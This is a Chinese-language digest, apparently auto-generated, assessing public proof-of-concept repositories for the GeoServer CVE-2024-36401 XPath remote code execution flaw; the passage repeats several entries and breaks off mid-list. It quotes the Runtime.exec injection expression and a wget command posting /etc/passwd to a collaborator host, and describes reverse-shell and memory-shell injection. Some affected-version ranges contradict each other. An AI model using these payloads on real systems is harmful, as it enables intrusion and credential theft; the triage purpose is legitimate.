CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的输入执行远程代码。该漏洞利用了 GeoTools 库 API 对要素类型属性名称的处理方式，使其能够被传递到 commons-jxpath 库并执行任意代码。漏洞利用代码提供了一个图形化界面，允许用户指定目标 URL 和要执行的命令。它构造一个恶意的 WFS GetPropertyValue 请求，其中 valueReference 属性包含一个执行命令的表达式 (例如, `exec(java.lang.Runtime.getRuntime(),"command")`)。然后，通过 HTTP POST 请求将该请求发送到目标 GeoServer 实例。漏洞利用代码还包括代理设置功能，允许用户通过代理服务器发送请求。该漏洞可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**投毒风险分析：**

代码中存在一定程度的投毒风险的可能性（约10%），主要体现在以下几个方面：

*   **依赖项：** `go.mod` 文件中存在一些第三方依赖项，例如 `fyne.io/fyne/v2` 用于图形界面。虽然这些依赖项本身是常用的，但它们可能会引入潜在的安全漏洞或后门，尤其是在构建过程中。
*   **图形界面：** 图形界面本身可能存在安全问题，例如，如果界面中的某些组件没有得到正确的安全处理，攻击者可能会利用这些组件来执行恶意代码。
*   **网络请求：** 代码中包含发起 HTTP 请求的代码。如果攻击者能够控制这些请求的内容，他们可能会利用这些请求来执行恶意操作。但是考虑到此项目是为了进行漏洞利用测试,因此远程请求是免不了的.
*   **内存马注入功能:** 代码声明包含内存马注入功能,虽然是为了漏洞利用,但也存在风险,可能被滥用。
*   **免责声明缺失:** 仓库中缺少明确的免责声明，可能导致使用者在未充分了解风险的情况下使用该工具，从而承担不必要的法律责任。

综上所述，该仓库中存在一定程度的投毒风险，但总体来说风险较低。使用者在使用该工具时应保持警惕，并仔细审查代码，以确保其安全性。

**项目地址:** [netuseradministrator/CVE-2024-36401](https://github.com/netuseradministrator/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #20

**来源**: [CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md](../2024/CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的用户执行任意代码

**影响版本:** 受影响版本包括 2.23.0 到 2.23.5, 2.24.0 到 2.24.3, 2.25.0 到 2.25.1 以及低于 2.22.6 的版本

**利用条件:** 需要网络访问，GeoServer实例可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，存在于处理属性名称表达式的过程中。该漏洞源于 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，该库在评估 XPath 表达式时可以执行任意代码。此漏洞影响所有 GeoServer 实例，因为 XPath 评估不正确地应用于简单要素类型。

**有效性分析：**
根据漏洞描述和提供的POC代码，此漏洞很可能有效。POC 代码通过 `GetPropertyValue` 请求，利用 `valueReference` 参数执行任意代码。POC代码中使用了 `exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`，这允许攻击者在服务器上执行命令。

**投毒风险分析：**
提供的POC代码本身旨在利用漏洞执行命令，例如`wget --post-file=/etc/passwd <BURP COLLOBRATOR>`。这表明，使用该代码的目的本身就是攻击和信息窃取。从代码本身来看，没有明显的迹象表明存在作者隐藏的“投毒”代码，例如篡改受害者系统上的其他文件或执行其他恶意操作，但不能排除。
仓库本身可能存在投毒风险，例如，如果存在其他隐藏的脚本或配置，则可能会导致更广泛的损害。因此，保守估计投毒风险为10%。

**利用方式：**
1.  攻击者构造恶意的OGC（例如WFS GetPropertyValue、WFS GetFeature、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）请求。
2.  在请求的参数中，例如 `valueReference`，注入包含恶意代码的 XPath 表达式。示例中使用的是`exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`。
3.  GeoServer在处理请求时，会将该表达式传递给存在漏洞的 GeoTools 库进行处理。
4.  `commons-jxpath` 库执行该恶意代码，导致远程代码执行。
5.  攻击者可以利用此漏洞在服务器上执行任意命令，例如反弹 shell、读取敏感文件等。

**缓解措施：**
*   升级到 GeoServer 2.22.6、2.23.6、2.24.4 或 2.25.2 及以上版本。
*   作为临时解决方案，可以从 GeoServer 中删除 `gt-complex-x.y.jar` 文件，但这可能会影响某些功能。

**项目地址:** [punitdarji/GeoServer-CVE-2024-36401](https://github.com/punitdarji/GeoServer-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #21

**来源**: [CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 默认GeoServer安装，可通过WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求进行利用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，由于GeoTools库不安全地将属性名称作为XPath表达式传递给commons-jxpath库导致的。未经身份验证的攻击者可以利用此漏洞通过构造恶意的OGC请求来执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已在野外被利用，并且存在公开的POC。提供的漏洞利用代码是一个Woodpecker插件，它支持批量探测和利用该漏洞，包括执行任意命令和注入内存马。该插件使用Java编写，并且提供了详细的使用说明，表明其有效性较高。

**投毒风险：**

该代码主要功能是漏洞利用，内存马注入，但是自定义内存马部分存在风险,如果被替换成恶意代码，可能存在投毒行为，因此风险为10%。

**利用方式：**

1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求），将恶意XPath表达式传递给GeoServer。
2.  **XPath注入：** GeoServer使用GeoTools库处理OGC请求中的属性名称。GeoTools库不安全地将这些属性名称传递给commons-jxpath库进行处理。
3.  **代码执行：** commons-jxpath库将恶意XPath表达式作为代码执行，导致远程代码执行。
4.  **内存马注入（可选）：** 攻击者可以使用该漏洞注入内存马，以便在目标服务器上持久化控制。

**总结：** CVE-2024-36401是一个高危的远程代码执行漏洞，易于利用且影响广泛。建议受影响的用户尽快升级到安全版本或采取缓解措施（例如删除`gt-complex-x.y.jar`文件）。提供的POC代码可以有效利用该漏洞，但也应谨慎使用，以避免潜在的恶意代码风险。

**项目地址:** [thestar0/CVE-2024-36401-WoodpeckerPlugin](https://github.com/thestar0/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #22

**来源**: [CVE-2024-36401-whitebear-ch_GeoServerExploit.md](../2024/CVE-2024-36401-whitebear-ch_GeoServerExploit.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的攻击者可以执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** 默认 GeoServer 安装，需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致未经身份验证的用户可以通过构造特定的 OGC 请求参数（如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）执行任意代码。

根据漏洞库信息和搜索结果，此漏洞利用已被积极利用。提供的漏洞利用代码（GeoServerExploit）表明已经存在可用的 PoC。

投毒风险分析：提供的漏洞利用代码仅包含 README.md 文件，展示了工具的使用示例和致谢信息。虽然从单个 README.md 文件无法完全判断是否存在投毒代码，但考虑到这是一个漏洞利用工具，仍有小概率（10%）存在作者隐藏的恶意代码或其他未公开的利用方式。需要检查完整的项目代码才能更准确地评估投毒风险。

利用方式总结：攻击者通过构造恶意的 OGC 请求，利用 commons-jxpath 库执行任意 XPath 表达式，从而实现远程代码执行。

**项目地址:** [whitebear-ch/GeoServerExploit](https://github.com/whitebear-ch/GeoServerExploit)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #23

**来源**: [CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2, < 2.22.6

**利用条件:** GeoServer实例需要能够处理WFS GetPropertyValue等OGC请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，该漏洞源于 GeoTools 库 API 不安全地将属性名称传递给 commons-jxpath 库，从而允许执行任意代码。PoC 代码通过构造 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行恶意命令。该 PoC 包含一个 Python 脚本 (exploit.py) 和一个类型名称列表 (type_names.txt)。脚本首先在攻击者主机上启动一个反向 shell 监听器，然后将反向 shell 命令进行 Base64 编码，最后通过特制的 WFS GetPropertyValue 请求发送到目标 GeoServer 实例。如果成功，GeoServer 将执行该命令，并将反向 shell 连接回攻击者主机。

**有效性：**

根据漏洞描述和搜索结果，该漏洞在野外已被利用，PoC代码是有效的。

**投毒风险：**

分析提供的 PoC 代码，未发现明显的恶意代码或后门。代码功能清晰，主要用于利用漏洞执行远程命令。`type_names.txt` 文件包含 GeoServer 已知类型名称列表，用于构造请求，本身不构成安全风险。`exploit.py` 脚本的功能是生成反向 shell 命令，对其进行编码，并通过构造的 WFS GetPropertyValue 请求发送它。不存在隐藏的恶意功能。

**利用方式：**

1.  攻击者需要一台能够建立网络连接的主机。
2.  攻击者运行 PoC 脚本，指定目标 GeoServer URL，以及反向 shell 的 IP 地址和端口。
3.  PoC 脚本构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求，其中 XPath 表达式注入了反向 shell 命令。
4.  GeoServer 在处理请求时，由于漏洞，会执行该恶意命令。
5.  攻击者主机收到来自 GeoServer 实例的反向 shell 连接，从而获得对服务器的控制。

总的来说，提供的PoC没有发现有投毒代码，主要通过java.lang.Runtime.getRuntime()执行命令。

**项目地址:** [yisas93/CVE-2024-36401-PoC](https://github.com/yisas93/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---



---

## POC #16

**来源**: [CVE-2024-36401-justin-p_geoexplorer.md](../2024/CVE-2024-36401-justin-p_geoexplorer.md)

## CVE-2024-36401 - GeoServer远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未授权的远程代码执行

**影响版本:** 受影响版本包括 2.23.0 到 2.23.6，2.24.0 到 2.24.4，2.25.0 到 2.25.2，以及低于 2.22.6 的版本。

**利用条件:** 默认 GeoServer 安装，网络可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，由于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致攻击者可以通过构造特定的 OGC 请求（如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）来执行任意代码。漏洞利用通过修改property/attribute，使之成为恶意的xpath表达式，触发commons-jxpath执行代码。提供的 PoC 代码 `GeoExplorer` 旨在扫描 GeoServer 实例并利用此漏洞。 

**有效性：**

根据漏洞库信息、搜索结果以及提供的 PoC 代码，此漏洞是有效的并且已被积极利用。搜索结果中多个链接表明该漏洞已被公开披露，并且有威胁情报报告指出该漏洞已被恶意利用。

**投毒风险：**

分析提供的 PoC 代码，主要的投毒风险在于：

1.  **Catcher URL:** `client/main.py` 脚本中使用了 `-c` 参数指定 catcher URL，用于接收被利用的服务器的回调。攻击者可以控制这个 URL，将受害者重定向到恶意站点或者收集敏感信息。虽然默认值指向本地地址，但用户如果配置不当，则存在风险。
2.  **wget Payload:**  PoC 使用 `wget` 作为 payload，这本身存在一定风险。虽然 `wget` 通常用于下载文件，但恶意用户可能会利用它执行其他恶意操作。例如，下载并执行一个 shell 脚本。
3. **依赖风险:** 该POC依赖requests, argparse, urllib3等第三方库，如果作者上传了包含恶意代码的软件包到Pypi，存在一定的供应链风险.

综合分析，PoC 代码本身主要用于漏洞验证和利用，但如果使用者不小心配置或被中间人攻击替换catcher URL，则可能存在一定投毒风险。假设用户会检查和修改 catcher URL，并从官方源安装依赖，因此评估投毒风险为10%。

**利用方式：**

1.  **扫描目标：** 使用 PoC 客户端扫描存在漏洞的 GeoServer 实例。
2.  **发现FeatureType：** 利用`ListStoredQueries` request on WFS 获取feature type
3.  **构造恶意请求：** PoC 通过构造包含恶意 XPath 表达式的 OGC 请求，例如 WFS GetFeature 请求，来触发漏洞。XPath 表达式注入到 property/attribute name 中。
4.  **远程代码执行：** GeoServer 解析请求时，`commons-jxpath` 库会执行恶意 XPath 表达式，从而导致远程代码执行。
5.  **回调：**  被利用的服务器通过 `wget` 向指定的 catcher URL 发送请求，表明漏洞利用成功。

**项目地址:** [justin-p/geoexplorer](https://github.com/justin-p/geoexplorer)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #17

**来源**: [CVE-2024-36401-kkhackz0013_CVE-2024-36401.md](../2024/CVE-2024-36401-kkhackz0013_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行（RCE）

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (<2.22.6), 2.23.x (>=2.23.0 <2.23.6), 2.24.x (>=2.24.0 <2.24.4), 2.25.x (>=2.25.0 <2.25.2)

**利用条件:** 默认 GeoServer 安装，可通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的用户通过构造特制的 OGC 请求来执行远程代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式进行评估。攻击者可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求来利用此漏洞。

提供的POC代码 `CVE-2024-36401.py` 通过发送特制的 WFS GetPropertyValue 请求来利用漏洞。该请求包含一个 `valueReference` 参数，其中包含一个 `exec` 函数，该函数允许执行任意命令。默认POC代码使用 `nc` 命令来反弹 shell。代码中未发现明显的投毒行为。

利用方式：

1.  攻击者向存在漏洞的 GeoServer 实例发送特制的 WFS GetPropertyValue 请求。
2.  请求中的 `valueReference` 参数包含要执行的恶意代码。
3.  GeoServer 将 `valueReference` 中的属性名称传递给 commons-jxpath 库进行评估。
4.  commons-jxpath 库执行恶意代码，导致远程代码执行。

根据搜索引擎结果，此漏洞已经被积极利用，因此POC的有效性非常高。

综上，该POC有效，且未发现明显的投毒风险。利用方式清晰，风险等级为严重。

**项目地址:** [kkhackz0013/CVE-2024-36401](https://github.com/kkhackz0013/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #18

**来源**: [CVE-2024-36401-lowsuet_CVE-2024-36401.md](../2024/CVE-2024-36401-lowsuet_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.x < 2.22.6, 2.23.x < 2.23.6, 2.24.x < 2.24.4, 2.25.x < 2.25.2

**利用条件:** 目标GeoServer实例在受影响版本范围内，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是一个 GeoServer 中的远程代码执行漏洞，源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。该漏洞影响所有 GeoServer 实例，无需身份验证即可利用。攻击者可以通过构造恶意的 WFS GetPropertyValue 请求，在目标服务器上执行任意命令。

**漏洞利用方式：**

1.  攻击者构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求。
2.  GeoServer 将属性名称传递给 commons-jxpath 库进行评估。
3.  commons-jxpath 库执行恶意 XPath 表达式，导致远程代码执行。

根据提供的漏洞利用代码，该 POC 使用 Go 语言编写，提供了一个图形化界面，允许用户指定目标 GeoServer URL 和要执行的命令，可以通过设置代理访问目标。该POC 代码通过构造恶意的`wfs:GetPropertyValue`请求，将命令传递给目标服务器执行。代码中使用了 `java.lang.Runtime.getRuntime()` 来执行命令，confirm 该方法是漏洞利用的关键。

**投毒风险分析：**

*   代码中存在网络请求功能，允许从远程服务器获取资源，增加了潜在的投毒风险。
*   代码中存在执行系统命令的功能，如果被篡改，可能被用于执行恶意操作。
*   虽然代码主要功能是利用漏洞，但如果作者植入恶意代码（例如，反弹 Shell 或下载执行恶意程序），则可能在使用者不知情的情况下感染目标系统。

考虑到以上风险，给与10%的投毒风险，请使用者在运行前仔细检查代码逻辑。

**项目地址:** [lowsuet/CVE-2024-36401](https://github.com/lowsuet/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #19

**来源**: [CVE-2024-36401-netuseradministrator_CVE-2024-36401.md](../2024/CVE-2024-36401-netuseradministrator_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 - 2.23.6, 2.24.0 - 2.24.4, 2.25.0 - 2.25.2

**利用条件:** 需要网络访问，GeoServer实例运行在受影响的版本上

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的输入执行远程代码。该漏洞利用了 GeoTools 库 API 对要素类型属性名称的处理方式，使其能够被传递到 commons-jxpath 库并执行任意代码。漏洞利用代码提供了一个图形化界面，允许用户指定目标 URL 和要执行的命令。它构造一个恶意的 WFS GetPropertyValue 请求，其中 valueReference 属性包含一个执行命令的表达式 (例如, `exec(java.lang.Runtime.getRuntime(),"command")`)。然后，通过 HTTP POST 请求将该请求发送到目标 GeoServer 实例。漏洞利用代码还包括代理设置功能，允许用户通过代理服务器发送请求。该漏洞可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**投毒风险分析：**

代码中存在一定程度的投毒风险的可能性（约10%），主要体现在以下几个方面：

*   **依赖项：** `go.mod` 文件中存在一些第三方依赖项，例如 `fyne.io/fyne/v2` 用于图形界面。虽然这些依赖项本身是常用的，但它们可能会引入潜在的安全漏洞或后门，尤其是在构建过程中。
*   **图形界面：** 图形界面本身可能存在安全问题，例如，如果界面中的某些组件没有得到正确的安全处理，攻击者可能会利用这些组件来执行恶意代码。
*   **网络请求：** 代码中包含发起 HTTP 请求的代码。如果攻击者能够控制这些请求的内容，他们可能会利用这些请求来执行恶意操作。但是考虑到此项目是为了进行漏洞利用测试,因此远程请求是免不了的.
*   **内存马注入功能:** 代码声明包含内存马注入功能,虽然是为了漏洞利用,但也存在风险,可能被滥用。
*   **免责声明缺失:** 仓库中缺少明确的免责声明，可能导致使用者在未充分了解风险的情况下使用该工具，从而承担不必要的法律责任。

综上所述，该仓库中存在一定程度的投毒风险，但总体来说风险较低。使用者在使用该工具时应保持警惕，并仔细审查代码，以确保其安全性。

**项目地址:** [netuseradministrator/CVE-2024-36401](https://github.com/netuseradministrator/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #20

**来源**: [CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md](../2024/CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的用户执行任意代码

**影响版本:** 受影响版本包括 2.23.0 到 2.23.5, 2.24.0 到 2.24.3, 2.25.0 到 2.25.1 以及低于 2.22.6 的版本

**利用条件:** 需要网络访问，GeoServer实例可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，存在于处理属性名称表达式的过程中。该漏洞源于 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，该库在评估 XPath 表达式时可以执行任意代码。此漏洞影响所有 GeoServer 实例，因为 XPath 评估不正确地应用于简单要素类型。

**有效性分析：**
根据漏洞描述和提供的POC代码，此漏洞很可能有效。POC 代码通过 `GetPropertyValue` 请求，利用 `valueReference` 参数执行任意代码。POC代码中使用了 `exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`，这允许攻击者在服务器上执行命令。

**投毒风险分析：**
提供的POC代码本身旨在利用漏洞执行命令，例如`wget --post-file=/etc/passwd <BURP COLLOBRATOR>`。这表明，使用该代码的目的本身就是攻击和信息窃取。从代码本身来看，没有明显的迹象表明存在作者隐藏的“投毒”代码，例如篡改受害者系统上的其他文件或执行其他恶意操作，但不能排除。
仓库本身可能存在投毒风险，例如，如果存在其他隐藏的脚本或配置，则可能会导致更广泛的损害。因此，保守估计投毒风险为10%。

**利用方式：**
1.  攻击者构造恶意的OGC（例如WFS GetPropertyValue、WFS GetFeature、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）请求。
2.  在请求的参数中，例如 `valueReference`，注入包含恶意代码的 XPath 表达式。示例中使用的是`exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`。
3.  GeoServer在处理请求时，会将该表达式传递给存在漏洞的 GeoTools 库进行处理。
4.  `commons-jxpath` 库执行该恶意代码，导致远程代码执行。
5.  攻击者可以利用此漏洞在服务器上执行任意命令，例如反弹 shell、读取敏感文件等。

**缓解措施：**
*   升级到 GeoServer 2.22.6、2.23.6、2.24.4 或 2.25.2 及以上版本。
*   作为临时解决方案，可以从 GeoServer 中删除 `gt-complex-x.y.jar` 文件，但这可能会影响某些功能。

**项目地址:** [punitdarji/GeoServer-CVE-2024-36401](https://github.com/punitdarji/GeoServer-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #21

**来源**: [CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 默认GeoServer安装，可通过WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求进行利用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，由于GeoTools库不安全地将属性名称作为XPath表达式传递给commons-jxpath库导致的。未经身份验证的攻击者可以利用此漏洞通过构造恶意的OGC请求来执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已在野外被利用，并且存在公开的POC。提供的漏洞利用代码是一个Woodpecker插件，它支持批量探测和利用该漏洞，包括执行任意命令和注入内存马。该插件使用Java编写，并且提供了详细的使用说明，表明其有效性较高。

**投毒风险：**

该代码主要功能是漏洞利用，内存马注入，但是自定义内存马部分存在风险,如果被替换成恶意代码，可能存在投毒行为，因此风险为10%。

**利用方式：**

1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求），将恶意XPath表达式传递给GeoServer。
2.  **XPath注入：** GeoServer使用GeoTools库处理OGC请求中的属性名称。GeoTools库不安全地将这些属性名称传递给commons-jxpath库进行处理。
3.  **代码执行：** commons-jxpath库将恶意XPath表达式作为代码执行，导致远程代码执行。
4.  **内存马注入（可选）：** 攻击者可以使用该漏洞注入内存马，以便在目标服务器上持久化控制。

**总结：** CVE-2024-36401是一个高危的远程代码执行漏洞，易于利用且影响广泛。建议受影响的用户尽快升级到安全版本或采取缓解措施（例如删除`gt-complex-x.y.jar`文件）。提供的POC代码可以有效利用该漏洞，但也应谨慎使用，以避免潜在的恶意代码风险。

**项目地址:** [thestar0/CVE-2024-36401-WoodpeckerPlugin](https://github.com/thestar0/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #22

**来源**: [CVE-2024-36401-whitebear-ch_GeoServerExploit.md](../2024/CVE-2024-36401-whitebear-ch_GeoServerExploit.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的攻击者可以执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** 默认 GeoServer 安装，需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致未经身份验证的用户可以通过构造特定的 OGC 请求参数（如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）执行任意代码。

根据漏洞库信息和搜索结果，此漏洞利用已被积极利用。提供的漏洞利用代码（GeoServerExploit）表明已经存在可用的 PoC。

投毒风险分析：提供的漏洞利用代码仅包含 README.md 文件，展示了工具的使用示例和致谢信息。虽然从单个 README.md 文件无法完全判断是否存在投毒代码，但考虑到这是一个漏洞利用工具，仍有小概率（10%）存在作者隐藏的恶意代码或其他未公开的利用方式。需要检查完整的项目代码才能更准确地评估投毒风险。

利用方式总结：攻击者通过构造恶意的 OGC 请求，利用 commons-jxpath 库执行任意 XPath 表达式，从而实现远程代码执行。

**项目地址:** [whitebear-ch/GeoServerExploit](https://github.com/whitebear-ch/GeoServerExploit)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #23

**来源**: [CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2, < 2.22.6

**利用条件:** GeoServer实例需要能够处理WFS GetPropertyValue等OGC请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，该漏洞源于 GeoTools 库 API 不安全地将属性名称传递给 commons-jxpath 库，从而允许执行任意代码。PoC 代码通过构造 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行恶意命令。该 PoC 包含一个 Python 脚本 (exploit.py) 和一个类型名称列表 (type_names.txt)。脚本首先在攻击者主机上启动一个反向 shell 监听器，然后将反向 shell 命令进行 Base64 编码，最后通过特制的 WFS GetPropertyValue 请求发送到目标 GeoServer 实例。如果成功，GeoServer 将执行该命令，并将反向 shell 连接回攻击者主机。

**有效性：**

根据漏洞描述和搜索结果，该漏洞在野外已被利用，PoC代码是有效的。

**投毒风险：**

分析提供的 PoC 代码，未发现明显的恶意代码或后门。代码功能清晰，主要用于利用漏洞执行远程命令。`type_names.txt` 文件包含 GeoServer 已知类型名称列表，用于构造请求，本身不构成安全风险。`exploit.py` 脚本的功能是生成反向 shell 命令，对其进行编码，并通过构造的 WFS GetPropertyValue 请求发送它。不存在隐藏的恶意功能。

**利用方式：**

1.  攻击者需要一台能够建立网络连接的主机。
